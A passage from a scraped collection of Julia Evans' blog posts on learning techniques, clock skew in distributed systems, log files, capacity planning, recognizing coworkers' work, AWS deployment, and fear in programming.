“Hello”, can you\ngo look at its memory and find out where those bytes are in its memory? How\ndo you do that? \n \n\n The important thing here is to ask the questions and explore the connections\nthat  you’re  curious about – maybe you’re not so interested in how the\nstrings are represented in memory, but you really want to know how many bytes a\nheart emoji is in Unicode! Or maybe you want to learn about how floating point\nnumbers work! \n\n I find that when I connect new facts to things I’m already familiar with (like\nemoji or floating point numbers or strings), then the information sticks a lot\nbetter. \n\n Next up, I want to talk about 2 ways to get information: asking a person yes/no questions, and asking the computer. \n\n how to get information: ask yes/no questions \n\n When I’m talking to someone who knows more about the concept than me, I find it\nhelps to start by asking really simple questions, where the answer is just\n“yes” or “no”. I’ve written about yes/no questions before in  how to ask good\nquestions , but I love it a lot so let’s\ntalk about it again! \n\n I do this because it forces me to articulate exactly what my current mental\nmodel  is , and because I think yes/no questions are often easier for the\nperson I’m asking to answer. \n\n For example, here are some different types of questions: \n\n \n Check if your current understanding is correct \n\n \n Example: “Is a pixel shader the same thing as a fragment shader?” \n \n How concepts you’ve heard of are related to each other\n\n \n Example: “Does shadertoy use OpenGL?” \n Example: “Do graphics cards know about triangles?” \n \n High-level questions about what the main purpose of something is\n\n \n Example: “Does mysql orchestrator proxy database queries?” \n Example: “Does OpenGL give you more control or less control over the graphics card than Vulkan?” \n \n \n\n yes/no questions put you in control \n\n When I ask very open-ended questions like “how does X work?”, I find that it often goes wrong in one of 2 ways: \n\n \n The person starts telling me a bunch of things that I already knew \n The person starts telling me a bunch of things that I don’t know, but which\naren’t really what I was interested in understanding \n \n\n Both of these are frustrating, but of course neither of these things are their\nfault! They can’t know exactly what information I wanted about X,\nbecause I didn’t tell them. But it still always feels bad to have to interrupt\nsomeone with “oh no, sorry, that’s not what I wanted to know at all!” \n\n I love yes/no questions because, even though they’re harder to formulate, I’m\nWAY more likely to get the exact answers I want and less likely to waste the\ntime of the person I’m asking by having them explain a bunch of things that I’m\nnot interested in. \n\n asking yes/no questions isn’t always easy \n\n When I’m asking someone questions to try to learn about something new,\nsometimes this happens: \n\n me:  so, just to check my understanding, it works like this, right? \n them:  actually, no, it’s <completely different thing> \n me (internally) : (brief moment of panic)  \n me:  ok, let me think for a minute about my next question \n\n It never quite feels  good  to learn that my mental model was totally wrong,\neven though it’s incredibly helpful information. Asking this kind of\nreally specific question (even though it’s more effective!) puts you in a more\nvulnerable position than asking a broader question, because sometimes you have\nto reveal specific things that you were totally wrong about! \n\n When this happens, I like to just say that I’m going to take a minute to\nincorporate the new fact into my mental model and think about my next question. \n\n Okay, that’s the end of this digression into my love for yes/no questions :) \n\n how to get information: ask the computer \n\n Sometimes when I’m trying to answer a question I have, there won’t be anybody\nto ask, and I’ll Google it or search the documentation and won’t find anything. \n\n But the delightful thing about computers is that you can often get answers to\nquestions about computers by… asking your computer! \n\n Here are a few examples (from past blog posts) of questions I’ve had and computer experiments I ran to\nanswer them for myself: \n\n \n Are atomics faster or slower than mutexes? (blog post:  trying out mutexes and atomics ) \n If I add a user to a group, will existing processes running as that user have the new group? (blog post:  How do groups work on Linux? ) \n On Linux, if you have a server listening on 0.0.0.0 but you don’t have any network interfaces, can you connect to that server? (blog post:  what’s a network interface? ) \n How is the data in a SQLite database actually organized on disk? (blog post:  How does SQLite work? Part 1: pages! ) \n \n\n asking the computer is a skill \n\n It definitely takes time to learn how to turn “I’m confused about X” into\nspecific questions, and then to turn that question into an experiment you can\nrun on your computer to definitively answer it. \n\n But it’s a really powerful tool to have! If you’re not limited to just the\nthings that you can Google / what’s in the documentation / what the people\naround you know, then you can do a LOT more. \n\n be aware of what you still don’t understand \n\n Like I said earlier, the point here isn’t to understand every single thing. But\nespecially as you get more senior, it’s important to be aware of what you don’t\nknow! For example, here are five things I don’t know (out of a VERY large\nlist): \n\n \n How database transactions / isolation levels work \n How vertex shaders work (in graphics) \n How font rendering works \n How BGP / peering work \n How multiple inheritance works in Python \n \n\n And I don’t really need to know how those things work right now! But one day\nI’m pretty sure I’m going to need to know how database transactions work, and I\nknow it’s something I can learn when that day comes :) \n\n Someone who read this post asked me “how do you figure out what you don’t know?”\nand I didn’t have a good answer, so I’d love to hear your thoughts! \n\n \nThanks to\nHaider Al-Mosawi,\nIvan Savov,\nJake Donham,\nJohn Hergenroeder,\nKamal Marhubi,\nMatthew Parker,\nMatthieu Cneude,\nOri Bernstein,\nPeter Lyons,\nSebastian Gutierrez,\nShae Matijs Erisson,\nVaibhav Sagar,\nand Zell Liew for reading a draft of this.\n \n\n"},
{"url": "https://jvns.ca/blog/2016/02/09/til-clock-skew-exists/", "title": "TIL: clock skew exists", "content": "\n     \n\n I learned some new things yesterday about distributed systems yesterday! Redis is a key-value store that can be distributed, and apparently it has a proposal for a locking system called  Redlock . \n\n Yesterday I read the articles where  Martin Kleppman criticizes Redlock  and  Redlock’s author, antirez, responds . \n\n These are very interesting to read as a distributed systems n00b – the authors of the articles are making significantly different arguments, and so it’s a useful exercise to try to reason through the arguments and figure out who you think is right. \n\n Martin Kleppman, as far as I understand, argues that Redlock isn’t safe to use because \n\n \n processes can pause for arbitrary amount of time (because of garbage collection or CPU scheduling) \n network requests can be arbitrarily delayed at any time \n The clock on a computer can be unreliable (because it goes at the wrong speed, or has jumped back in time) \n \n\n Probably other reasons too, but those are the ones I understood. \n\n Here’s a chart from his post illustrating  how things can go wrong: \n\n \n\n process pauses & network delays are totally real. but, clock skew? \n\n Part of antirez’s response is “well, you can assume your clock is mostly correct though!”. \n\n \n What they need to do is just, for example, to be able to count 5 seconds with a maximum of 10% error. So one counts actual 4.5 seconds, another 5.5 seconds, and we are fine. \n \n\n Now, I totally believe in garbage collection. I’ve seen services become unresponsive because they were garbage collecting. So I definitely believe in process pauses. \n\n I also believe in arbitrary network delays! If you told me that some of my replies saying “hey I’m finished with the lock” would be (very very occasionally) delayed for 1-2 seconds, I’d believe you. 1-2 seconds is a lot of computer time!! \n\n As far as I can tell, either of those two things by themselves is enough to make Redlock not safe. (if you account for process pauses, you could  still have another process pause after you account for them , right?) \n\n But, we were talking about clock skew. \n\n Clock skew is when your clock is going, say, 10% or 2x faster than it should. If uncorrected, this is a disaster for a system that depends on knowing the right time. \n\n Here’s the thing – I haven’t seen a lot of systems, but I’ve never seen a system with a clock running too fast. My laptop’s clock mostly works, as far as I know my servers at work have approximately correct clocks (though maybe they don’t and I just don’t know!). Why is Martin Kleppman so worried about this? \n\n I asked about this, and  @handler  and  @aphyr  both helped me out. They were basically both totally “julia systems with clocks that go at bogus speeds totally exist. 2x clock skew is real”. \n\n a few links about clock skew \n\n Check out this 1999 paper  by Nelson Minar that surveys NTP (network time protocol) servers and finds that they’re often serving incorrect times. \n\n The trouble with timestamps  by @aphyr has a great explanation about why you should care about your clock. \n\n Here’s  an attack on Tor  where if you induce high CPU load on a node, the temperature is likely to cause the clock skew to increase on that node. There’s also  a follow up paper \n\n Leap seconds are real. (there was one in 2015!) This post  5 different ways to handle leap seconds  has a ton of cool graphs. (thanks  Nick Coghlan !) \n\n Google pretty much knows what time it is – they invested a ton of time in a system called Spanner. Here are  a couple  of  articles  about that. \n\n distributed systems & weird computer things \n\n Distributed systems researchers are really really concerned with adverse, sometimes uncommon, things that can happen to your computer (like clock skew). \n\n I think they’re concerned for three reasons: \n\n \n they’re trying to prove theorems, and if you’re proving a theorem you need to worry about all the edge cases \n they’re operating literally 20 million computers. if you have 20 million computers everything that can go wrong with a computer will go wrong. \n some of those seemingly uncommon things are actually quite common (like network partitions) \n \n\n I don’t know at all how many computers Google has, but I bet it’s a lot. Like 20 million or something. \n\n Reasons 1 and 2 are related – if you prove a theorem that your system is safe, then it’ll be safe even if you have 20 million computers. Theorems are the best. \n\n So my laptop’s clock is probably mostly okay, but at Google scale I’d imagine you have computers with broken clocks all the time. \n\n reasoning about distributed systems is interesting \n\n I’m not a distributed systems engineer, really. (though I deal with some at work sometimes). I think, if you have plans to interact with distributed systems in the future, it’s really useful to try to reason through issues like this for yourself! There’s a ton of terminology (the first time I watched one of the  Jepsen talks  I was like “wat.”) \n\n So I think it’s fun to practice sometimes. Maybe one day you learn what linearizability is! and 6 months later you’re like “oh I actually didn’t get it I was totally wrong.” \n\n clock skew is real \n\n People I know have experienced it! It is not just a weird theoretical thing to give researchers jobs. Huh. \n\n \nthanks for  Camille Fournier ,  Michael Handler , and  Kyle Kingsbury  for trying to explain distributed systems things to me. I have likely made lots of mistakes in writing this, and those mistakes are all mine :)\n \n\n"},
{"url": "https://jvns.ca/blog/2016/02/12/why-i-love-log-files/", "title": "Why I love log files", "content": "\n     \n\n Dan Luu wrote a fantastic blog post recently on  the limitations of sampling profilers & tracing tools from the future , which you should totally read. I’m pretty into having conversations with people via blogging, so this is my much more pedestrian and less futuristic response to that post. \n\n tracing vs profiling \n\n One of the biggest takeaways from Dan’s post for me is: \n\n \n Sampling profilers, the most common performance debugging tool, are notoriously bad at debugging problems caused by tail latency because they aggregate events into averages. But tail latency is, by definition, not average. \n \n\n I learned this recently at work! I had a Thing that was slow. And I was staring at a dashboard with all kinds of  graphs that looked like this: \n\n \n\n This was maybe a graph of 95th percentile latency or something. Whatever. It wasn’t helping. None of the spikes in the graphs had anything to do with my slow thing. Then I asked  Nelson  for advice and he was basically like “dude, look at the logs!”. \n\n The basic rationale for this is exactly what Dan says – if you have 1000 events that were unusually slow, they probably failed because of a relatively uncommon event. And uncommon events do not always show up in graphs. But know where they show up? LOG FILES. WHICH ARE THE BEST. As long as you’ve put in enough print statements. \n\n log files: total instant success \n\n So, back to debugging my Thing. I stopped trying to look at graphs, took Nelson’s advice and looked at the log files for the 10 slowest requests. \n\n The logs were all like \n\n \n00:00:01.000 do thing 1\n00:00:01.012 do thing 2\n00:00:01.032 do thing 3\n00:00:01.045 do thing 4\n00:00:01.056 do thing 5\n00:00:02.158 do thing 6\n00:00:02.160 do thing 7\n \n\n In this log file, obviously thing 5 is the problem! It took like a second before getting to thing 6! What the hell, thing 5. \n\n I’ve gotten a little more into debugging performance problems, and every time I do it, I find that \n\n \n graphs are a great way to get an overall general picture of the system (oh, the error rate suddenly and permanently increased by 2x on March 13 at 3pm?) \n graphs are also great for seeing correlations (every time we deploy code our CPU usage spikes and we have timeouts?) (but remember: CORRELATION IS NOT CAUSATION GUYS. NEVER.) \n logs are amazing for digging into short spikes of timeouts or slow requests. Often I’ll look at the logs for a few requests, they’ll all exhibit the same behavior, and I’ll have a much clearer understanding of what happened there. \n \n\n That’s how I learned that logging a bunch of events (“do thing 1”) at a few well-chosen points in your code can be pretty useful, if log files are the only way you have to trace requests. \n\n a very small digression on Splunk \n\n Splunk is a tool that ingests your logs. It costs money and they are definitely not paying me but it is AMAZING WIZARD MAGIC. \n\n Today I was talking about performance with a coworker and then we used Splunk to parse the nginx server logs, extract all the request times, and draw the median and 95th percentiles every hour. That’s like totally trivial with Splunk. \n\n magical tracing tools are like log files! \n\n I think it’s cool that these performance tools from the future that Dan describes are basically like.. magical wizard log files. And they’re great for the same reason that log files are great. Because they are both tracing tools and tracing is important! \n\n Zipkin  is a tool that serves a similar purpose, somewhere in between a bunch of print statements and the high performance instrumentation tools Dan is describing. It’s based on  Dapper , a distributed tracing framework at Google. I don’t know what other tracing tools exist, though!  Let me know? \n\n"},
{"url": "https://jvns.ca/blog/2016/03/20/how-do-you-do-capacity-planning/", "title": "How do you do capacity planning?", "content": "\n     \n\n I’ve been wondering recently about capacity planning. For example! Suppose you run a concert ticket website. \n\n One day, you’re hit with a bunch of extra load. Your server can’t handle it, and your customers are sad (they were trying to buy tickets for the Beyonce concert that just got announced and they couldn’t!!!). You’re sad. Everyone is sad. \n\n How do you fix it so that when Jay Z’s tickets go on sale next week, everything will be fine? Or how to you plan server purchases for the next year of huge ticket sales now that you’ve signed a lot of awesome new deals? CAPACITY PLANNING. \n\n I don’t know a lot about how to do capacity planning. But here’s what I do know! warning: i am not a magical performance architect or whatever. I’m just here trying to make sense of computers. \n\n Resources \n\n Your application uses resources. The main ones I know are \n\n \n disk I/O \n network bandwidth \n CPU \n databases, probably \n locks (which we’ll get into in a bit) \n \n\n The first step when capacity planning is (or when doing performance work, generally) is to figure out which resource(s) you’re the most limited by, how much of that resource you’re using right now, and how much capacity have you there. For example! If every request takes 2s of CPU time (whoa.), then you can only handle 0.5 of them per CPU every second! \n\n To figure out which resource you’re most limited by, the easiest method I’ve seen so far is \n\n \n watch your program explode (BOOM HUGE TICKET SALE) \n look at a lot of graphs \n go “welp, looks like the CPU graph was the saddest this time” \n conclude that you’re limited by your CPU usage \n \n\n This sucks because your application has to explode but it seems pretty easy otherwise. (I would love to learn about non-application-exploding techniques if you know any). Once I have a vague idea of which resource is sad, I find it helpful to collect a bit more information. \n\n It’s pretty easy to measure how much CPU your application is using (you can use  the  clock_gettime  system call ). Network is also not too hard – you can use some system monitoring tool like  dstat  of  iftop , see how much network gets used after 20 minutes or an hour, and then figure out what the average usage is. Similarly for disk usage. \n\n Databases are quite a bit more tricky. If I wanted to know how query load my database could sustain, I’d probably spin up a new instance of that database and load test it until it stopped working. That’s a lot more time intensive, though! \n\n You’ll notice in all of these examples, I’ve assumed that your program has consistent usage patterns (that one Jay-Z ticket won’t take 100x more resources than another). This often totally isn’t true in practice! I do not have a cool answer for how to deal with this. \n\n locks: a weird resource \n\n Kelsey  very correctly noted on twitter  that if you’re selling tickets, it’s SUPER IMPORTANT to not sell more tickets than you actually have. So you need to create some kind of lock so that every ticket machine can check and make sure that this new person can actually get a ticket. Locks are not a kind of resource you can just get more of, since they’re about synchronization! I will not say more about this here but it’s super super important. \n\n Load balancing \n\n Okay, awesome. You went back and looked at the graphs from the Beyonce sale, and you noticed that the database servers went BOOOM. You do not know how to make them faster, but you do know how to add more servers! Right now you have 7 servers. Maybe you need 14? Huh. \n\n This is where we get to talk about cool things like utilization and load balancing. So. Suppose you have 7 identical database servers you’re sending queries to, and you always pick a random server. \n\n Now, suppose you have 100 queries per second that you’re making. I did a cool simulation of how the “pick a random server” strategy distributes load: \n\n db     number of queries\ndb1    16\ndb2    16\ndb3    14\ndb4    12\ndb5    16\ndb6    18\ndb7     8\n \n\n db7 has  half  as much work to do as db1! That’s not fair at all! This means you can end up in situations where one machine gets too much work to do (say 30% more than it can handle) while another machine is sitting mostly idle. So you’re paying for machines that aren’t helping you solve your problem! Ugh. No fun. \n\n So load balancing strategies actually matter. \n\n There’s a cool paper that says that the following algorithm: \n\n \n pick 2 random machines \n figure out which machine has less load \n send your request to that one \n \n\n is actually an awesome and very stable load balancing strategy. I do not have a link right now but I will put one up when I get it. \n\n how much do load balancing strategies actually matter? \n\n How bad is it to use a random load balancing strategy? I feel like this is something I should be able to solve with a math degree, but I don’t know! Does it mean you need 25% more machines than if you had a good strategy? 50% more? I have no idea. Do you? \n\n reasoning is cool \n\n I’m very slowly starting to realize that, when you’re trying to make computers do a lot of stuff, there are maybe easier strategies than “just throw more computers at it until you are no longer on fire”. My job got quite a bit less confusing when I realized I could actually  measure  how much CPU I was using, and scale CPU resources accordingly. \n\n So maybe you can actually measure and determine in advance how many computers you need to not be on fire! Also it seems like there’s some connection to autoscaling here, but I really know nothing about autoscaling here. \n\n If you know how to do capacity planning (or know a good blog post/book I should read) please let me know! I am  on twitter as always . \n\n"},
{"url": "https://jvns.ca/blog/2020/07/14/when-your-coworker-does-great-work-tell-their-manager/", "title": "When your coworker does great work, tell their manager", "content": "\n     \n\n I’ve been thinking recently about anti-racism and what it looks like to support\ncolleagues from underrepresented groups at work. The other day someone in a\nSlack group made an offhand comment that they’d sent a message to an engineer’s\nmanager to say that the engineer was doing exceptional work. \n\n I think telling someone’s manager they’re doing great work is a pretty common\npractice and it can be really helpful, but it’s easy to forget to do and I wish\nsomeone had suggested it to me earlier. So let’s talk about it! \n\n I  tweeted about this to ask how people approach it  and as usual I got a ton of great replies that I’m going to summarize here. \n\n We’re going to talk about what to say, when to do this, and why you should ask first. \n\n ask if it’s ok first \n\n One thing that at least 6 different people brought up was the importance of\nasking first. It might not be obvious why this is important at first — you’re\nsaying something positive! What’s the problem? \n\n So here are some potential reasons saying something positive to someone’s\nmanager could backfire: \n\n \n Giving someone a compliment that’s not in line with their current goals. For\nexample, if your coworker is trying to focus on becoming a technical expert\nin their domain and you’re impressed with their project management skills,\nthey might not want their project management highlighted (or vice versa!). \n Giving someone the wrong “level” of compliment. For example, if they’re a\nvery senior engineer and you say something like “PERSON did\nSIMPLE_ROUTINE_TASK really well!” — that doesn’t reflect well on them and\nfeels condescending. This can happen if you don’t know the person’s position\nor don’t understand the expectations for their role. \n If your coworker was supposed to be focusing on a specific project, and\nyou’re complimenting them for helping with something totally unrelated,\ntheir manager might think that they’re not focusing on their “real” work.\nOne person mentioned that they got reprimanded by their manager for getting\na spot peer bonus for helping someone on another team. \n Some people have terrible managers (for example, maybe the manager will feel\nthreatened by your coworker excelling) \n Some people just don’t like being called out in that way, and are happy with\nthe level of recognition they’re getting! \n \n\n Overall: a lot of people (for very good reasons!) want to have control over the\nkind of feedback their manager hears about them. \n\n So just ask first! (“hey, I was really impressed with your work on X project\nand wanted to send this note to $MANAGER to explain how important your work\nbecause I know she wasn’t that involved in X project and might not have seen\neverything you did, is that ok with you?”) \n\n when it’s important: to highlight work that isn’t being recognized \n\n Okay, now let’s talk about when this is important to do. I think this is pretty\nsimple – managers don’t always see the work their reports are doing, and if\nsomeone is doing really amazing work that their manager isn’t seeing, they\nwon’t get promoted as quickly. So it’s helpful to tell managers about work that\nthey may not be seeing. \n\n Here are some examples of types of important work that might be underrecognized: \n\n \n work by someone from another department (maybe their manager doesn’t\nunderstand how helpful their contribution was to the company because they\ndon’t work with your team that much, but your coworker’s work made a huge\ndifference!) \n work that happened in a private channel (for example if someone spent hours\nhelping you with something 1:1 and it really made a big difference to the\nsuccess of your project) \n work preventing problems, which often isn’t as visible as firefighting work \n work by people from underestimated groups (maybe your coworker’s work isn’t\nbeing recognized as much as it should be because of racism/sexism/etc!) \n documentation/code review/other kinds of work that aren’t always as visible\nas programming \n work by remotes (if remote work is less visible at your company) \n work by someone in a role that’s typically underrecognized (someone mentioned\nsupport as an example) \n \n\n Also, everyone agreed that it’s always great to highlight the contributions of\nmore junior coworkers when they’re doing well. \n\n why it matters: it helps managers make a case for promotion \n\n For someone to get promoted, they need evidence that they’ve been doing\nvaluable work, and managers don’t always have the time to put together all that\nevidence. So it’s important to be proactive! \n\n You can work on this for yourself by writing a  brag\ndocument , but having statements from\ncoworkers explaining how great your work really helps build credibility. \n\n So providing these statements for your coworkers can help them get recognized\nin a timely way for the great work they did (instead of getting promoted a year\nlater or something). It’s extra helpful to do this if you know the person is up\nfor promotion. \n\n how to do it: be specific, explain the impact of their work \n\n Pretty much everyone agreed that it’s helpful to explain what specifically the\nperson did that was awesome (“X did an incredible job of designing this system\nand we haven’t had any major operational issues with it in the 6 months since\nit launched, which is really unusual for a project of that scale”). \n\n how to do it: highlight when they’re exceeding expectations \n\n Because the point is to help people get promoted, it’s important to highlight\nwhen people are exceeding expectations for their level, for example if they’re\nnot a senior engineer yet but they’re doing the kind of work you’d expect from\na senior engineer. \n\n how to do it: send the person the message too \n\n We already basically covered this in “ask the person first”, but especially if\nI’m using a feedback system where the person might not get the feedback\nimmediately I like to send it to them directly as well. It’s nice for them to\nhear and they can also use it later on! \n\n public recognition can be great too! \n\n A couple of folks mentioned that they like to give public recognition, like\nmentioning how great a job someone did in a Slack channel or team meeting. \n\n Two reasons public recognition can be good: \n\n \n It helps build credibility for your colleague \n It lets the person you’re recognizing be part of the\nconversation/reciprocate to the feedback-giver, especially if the work was a\ncollaboration. \n \n\n Again, it’s good to ask about this before doing this – some people dislike\npublic recognition. \n\n on peer bonuses \n\n A few people who work at Google (or other companies with peer bonuses)\nmentioned that they prefer to give peer bonuses for this because it’s a more\nofficial form of recognition. \n\n Lots of people mentioned other forms of feedback systems that they use instead\nof email. Use whatever form of recognition is appropriate at your company! \n\n anyone can do this \n\n What I like about this is it’s a way everyone can help their coworkers – even\nif you’re really new and don’t feel that qualified to comment on how effective\nsomeone more senior is at their job, you can still point out things like “this\nperson helped me do a project that was really out of my comfort zone!” \n\n maybe expand the set of people you do this for! \n\n I think it’s very common for people to promote the work of their friends in\nthis way. I’ve tried to expand the set of people I do this for over time – I\nthink it’s important to keep an eye out for coworkers who are really excelling\nand to make sure their work is recognized. \n\n more reading on sponsorship \n\n I wanted to just talk about this one specific practice of telling someone’s\nmanager they’re doing great work but there are a LOT of other ways you can help\nlift your coworkers up. Lara Hogan’s post  what does sponsorship look\nlike?  has a lot of\ngreat examples. \n\n Mekka Okereke has a wonderful Twitter thread about another way you can support\nunderrepresented folks: by being a  “difficulty anchor” . It’s\nshort and definitely worth a read. \n\n thanks to Sher Minn Chong, Allie Jones, and Kamal Marhubi for reading a draft of this \n\n"},
{"url": "https://jvns.ca/blog/2016/11/16/ideas-about-how-to-use-aws/", "title": "Ideas about how to use AWS", "content": "\n     \n\n At work we have thousands of AWS instances to manage. My job these days is to\nmake it easy for other software engineers to deploy code to those machines. \n\n In doing this, it’s really useful for me to have examples of platforms that\nmake it easy for people to deploy code. For example, Heroku is a super popular\nplatform! I often think “why can’t we be as easy to use as Heroku?” and then\ntry to make us a little more like that. \n\n Recently I looked at  Skyliner , another platform\nthat lets you deploy code to computers, specifically AWS instances. Here’s their  launch post .\nI’m not super interested myself in using Skyliner or Heroku, but I am interested in looking at their design decisions! In particular I think Skyliner is\ninteresting if you use Amazon Web Services (like I do) because they’ve made a\nbunch of choices about which AWS features to use, and if you try it out you can\nsee exactly which AWS features they’re using and how. \n\n A disclaimer: i know the people who founded skyliner, so I’m not an unbiased\nobserver. I have not used it for more than 30 minutes and I won’t make any\nclaims about whether you should or should not use it. \n\n Anyway here are 3 new things I learned: \n\n New AWS instances take less than 5 minutes to start up \n\n Skyliner deploys your code by \n\n \n Launching entirely new AWS instances \n Setting them up \n Making sure they work (with a healthcheck) \n \n\n When I saw this I thought it might take forever. But it turns out that starting\nnew AWS instances is not that slow! Neat. It’s still kind of slow, quite a bit\nslower than my deploys at work. But not as slow as I thought. And it comes with\na lot of nice properties (security updates get applied every time you deploy,\nit’s completely impossible for state from the previous deploy to leak). \n\n You can use Docker in a simple way \n\n I’ve been skeptical of Docker on this blog. Docker has a ton of super\ncomplicated pieces. The Skyliner people wrote a post that advocates  Use containers. Not too much. Mostly for packaging. .\nBut what does that even mean? \n\n WELL I FOUND OUT WHAT IT MEANS. Coda (who wrote that post) told me the exact\ncommand line arguments they use with Docker today and it explained a lot. \n\n docker run --detach --net host --log-driver syslog --log-opt tag=\"{$appName}\"\n--restart always --env-file /etc/{$appName}.env {$appName}{\\n}`\n \n\n --net host  means “use the host networking namespace, don’t do any weird container networking stuff”. GREAT. \n\n They don’t use a Docker registry. They package the Docker image into a tarball,\nencrypt it, put it in S3, and then download it onto your machine. Super simple.\nIt also doesn’t use Docker Swarm or any of the new container orchestration\nstuff – a single application runs on a single AWS instance. This makes me feel\na lot more comfortable with Docker – I’ve been reading a lot of bad press\nabout Docker recently but it seems like if you’re very careful with which\nfeatures you use, maybe it will work fine! \n\n Load balancers are the best \n\n Okay, I already know that load balancers are the best. At work we have load\nbalancers, and when a box explodes or a service goes down, it says “whoops,\nguess that healthcheck failed”, routes traffic away from that box, and\neverything is totally fine. Nobody even knows there was a problem. \n\n Skyliner uses Amazon Application Load Balancers. The cool thing about these\nload balancers (vs HAProxy, which is what I use at work) is that they have an\n API . You can ask them questions about what they’re up to. Why is this\ninteresting? WELL. \n\n Let’s say you’re doing a deploy, and you want to know if your new instances\nthat you deployed are a) totally fine or b) completely exploded. I do not know\nhow to do this with HAProxy (though maybe there is a way that I do not know!). But with these LBs, you can use the\n DescribeInstanceHealth API method! .\nThen you can be like “wow, those instances… those are not up, nope, not at all”\nand roll back. You can also register new instances and deregister instances and\nall kinds of things. \n\n Skyliner describes their load balancers like this: \n\n \n An Application Load Balancer, which supports both HTTP/2 and WebSockets, configured to send logs to your S3 log bucket. Connection draining is enabled, which allows for zero-downtime deploys. \n \n\n So they tell your load balancer “hey, don’t use this instance anymore! Except wait 5 minutes and let any old connections finish please!”. That’s called “connection draining”. \n\n This week I am weirdly extremely excited about load balancers with APIs,\nprobably more than a normal person should be. \n\n Spying on architecture is fun \n\n AWS is a super complicated platform. They have like 30 bajillion services you\ncan use. SNS! SQS! RDS! EC2! SES! FPS! KMS! DynamoDB! Container registry!\nContainer service! And that is only a small fraction. I often find it really\noverwhelming and it is my job to work with AWS. \n\n Skyliner isn’t open source. But as a Skyliner non-user (and an AWS user), just\nbeing able to look at how they’ve put together AWS stuff into a coherent\nproduct and considering which choices they made might also be good choices for\nme is super useful! Like, they use Amazon key management service! Should I be\nusing that? Well, what do they use it for? \n\n I’ve been talking to friends a lot about how good architecture is super super\nvaluable – if someone can write down in a document how a system should work,\nand that description is workable, then it can save a ton of missteps even if\nyou still have to write all the code. Skyliner’s architecture seems useful\nto me so far! If you would like to also read some architecture there is an\n architecture document here . \n\n"},
{"url": "https://jvns.ca/blog/2014/12/21/fear-makes-you-a-worse-programmer/", "title": "Fear makes you a worse programmer", "content": "\n      Yesterday morning, I asked on Twitter: \n\n \n Does anyone have good writing about fear + programming (and how being\nafraid to make important changes makes you a worse programmer?) \n \n\n and \n\n \n I feel like there’s this really important line between caution (a++\nexcellent) and fear (which holds you back from doing necessary work) \n \n\n A lot of  super interesting discussion ensued , and I’d\nlike to talk about some of it. \n\n Before I start,  Ryan Kennedy  linked me\nto this slide deck of a presentation he gave called\n Fear Driven Development \nwhich I absolutely loved, and I think you should look at it. I think my\nfavorite sentence from that presentation is  “Fear creates local\nmaximums.” \n\n I find that when I’m afraid, I become super conservative. WE CANNOT\nPOSSIBLY MAKE THIS CHANGE WHAT IF IT BREAKS?! And this means worse\nsoftware! It’s actually kind of disastrous. If you’re scared of making\nchanges, you can’t make something dramatically better, or do that big\ncode cleanup. Maybe you can’t even deploy the code that you already\nwrote and tested, because it feels too scary. You just want to stick\nwhat’s sort-of-working, even if it’s not great. \n\n \n\n Better tools & process => less fear \n\n A lot of people brought up tools and processes. (in particular the\nfantastic  Kelsey Gilmore-Innis , who\nhas new-to-me things to say about better processes for testing code\nevery time I talk to her) \n\n Kelsey: \n\n \n I know you’re talking more psychologically, but this is one of my main\nreasons I believe investing in tests early is important \n\n […] obsessive monitoring, CI, canary deploys, chatops, dogfooding,\nselfserve infra \n \n\n So! Here are a few ways tools and processes can make us less afraid: \n\n Version control  means that you can make changes to your code without\nbeing scared of losing the old version. This one is so basic to me now\n– I can’t even imagine how afraid I would be if I were programming\nwithout version control. \n\n So many people mentioned  testing  as a way to build confidence. My\nfavorite thing I’ve ever read about testing is this book  Working\nEffectively with Legacy\nCode ,\nwhere  every chapter\ntitle \nis something that’s scary or difficult about working with legacy code.\n(He defines “legacy code” as “code without tests”, to give you a\nflavor). For instance: “I Don’t Understand the Code Well Enough To\nChange It.“, “How Do I Know That I’m Not Breaking Anything?”, “I Don’t\nHave Much Time and I Have To Change It.” \n\n This tweet from  Uncle Bob Martin ,\nexplains this idea pretty well: \n\n \n Even with good design, w/o tests you will fear change and so the code\nwill rot.  With good tests, there’s no fear, so you’ll clean the code. \n \n\n But testing and version control are not the only tools we have! We can\nalso build \n\n \n QA environments where breaking things is totally allowed and encouraged \n deploys that go out a little bit at a time \n the ability to roll back a deploy easily \n QA teams, whose job it is to exhaustively test software \n tools that will email you if your program throws exceptions \n \n\n and lots more. \n\n Fear of retribution (and blameless postmortems) \n\n But tools and processes are absolutely not the only thing. Even if I\nhave amazing tools and QA systems and the best deploy tools and\nwell-testing code, I’m  still going to make mistakes sometimes . And\nwhat happens when I make a mistake is really critical. \n\n Etsy and Google and Stripe (where I work) all have  blameless postmortems .\nThis means that if you make a change and that change breaks something,\npeople talk about what happened by focusing on the change and the facts,\nnot on blaming you. (“what about that change caused a problem?” instead\nof “how did Julia break it?”) \n\n I also realized that this goes much further than programming, and\n Marc  linked me to\n this amazing site about restorative justice , which you should also go read. \n\n So if you blame people for breaking things, they’ll be more scared to\nmake changes in the future, and you’ll end up with worse programs. Huh. \n\n Irrational fears \n\n One last thing that that  Fear Driven Development talk  talks\nabout that really resonated with me was – some fears are irrational,\nand that they can  infect other people . If you do a deploy, something\ngoes wrong, and you figure out the cause and fix the problem and nobody\nyells at you, hopefully future deploys should not be scary! \n\n But because we are only human and not Logical Robots, sometimes they\nstill are, and maybe you’ll feel nervous about doing deploys for a while\nuntil you see that things are really usually fine. \n\n I think there’s a lot more to be said about irrational fears, and I\nwould be interested to hear more. \n\n This year was the first year that I worked on large software systems\nthat affect lots of people, and it’s been scary sometimes! Next year\nwill be the second year, and my plan is for it to be easier =) \n\n (thanks to  Maggie Zhou  and  Kelsey Gilmore-Innis  and  Melissa Santos  and many others for all saying\nexcellent things and making me have new thoughts!) \n\n A couple of more talks / posts about fear that I enjoyed: \n\n \n Fear of programming  (via  @booleancz ) \n Fear Driven Development  (totally different, by Scott Hanselman) \n \n"},
